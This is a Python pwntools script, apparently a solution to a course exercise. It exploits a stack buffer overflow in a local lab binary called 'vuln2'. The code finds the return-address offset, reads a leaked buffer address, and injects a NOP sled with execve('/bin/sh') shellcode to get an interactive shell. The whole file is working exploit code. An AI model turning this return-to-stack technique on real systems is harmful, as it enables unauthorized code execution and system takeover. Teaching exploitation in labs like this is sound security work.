#!/usr/bin/env python3
"""Solution for vuln2: return-to-stack -- inject shellcode and return into buf.

Key pwntools:
  shellcraft.sh() + asm() : execve("/bin/sh") shellcode bytes
  NOP sled (b'\\x90'*n)     : absorb landing-address slack (lecture "NOP Sled")
  p32(addr)               : return address as little-endian 4 bytes
  recvline / int(...,16)  : parse the buf address the program leaks

Layout inside buf:
  [ NOP sled .......... ][ shellcode ][ return addr = start of buf ]
  Returning lands at the start (NOPs) and slides down into the shellcode.

Run:  cd example3 && make && python3 solution3/solve_vuln2.py

To confirm control first, replace the shellcode with asm('jmp $') -- if the
program hangs (infinite loop) you have hijacked the return address.
"""
import os
from pwn import *

context.update(arch="i386", os="linux", log_level="info")

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "vuln2")


def find_offset():
    """Use cyclic + core dump to get the buf -> return address offset."""
    io = process(BIN)
    io.recvuntil(b"payload:\n")
    io.sendline(cyclic(400))
    io.wait()
    off = cyclic_find(io.corefile.eip)
    io.close()
    log.success("offset(buf -> return address) = %d", off)
    return off


def main():
    offset = find_offset()

    io = process(BIN)
    leak = io.recvline_startswith(b"buf is at ")
    buf_addr = int(leak.split()[-1], 16)
    log.success("leaked buf @ %#x", buf_addr)
    io.recvuntil(b"payload:\n")

    shellcode = asm(shellcraft.sh())          # execve("/bin/sh", 0, 0)
    # Put shellcode at the end of the buffer, NOP sled in front of it.
    payload = b"\x90" * (offset - len(shellcode)) + shellcode
    assert len(payload) == offset, "shellcode larger than the buffer"
    payload += p32(buf_addr)                   # return to buf start (NOP sled) -> shellcode

    io.sendline(payload)
    log.success("shellcode injected -- checking for a shell")
    io.sendline(b"id; uname -a; echo PWNED")
    io.interactive()


if __name__ == "__main__":
    main()
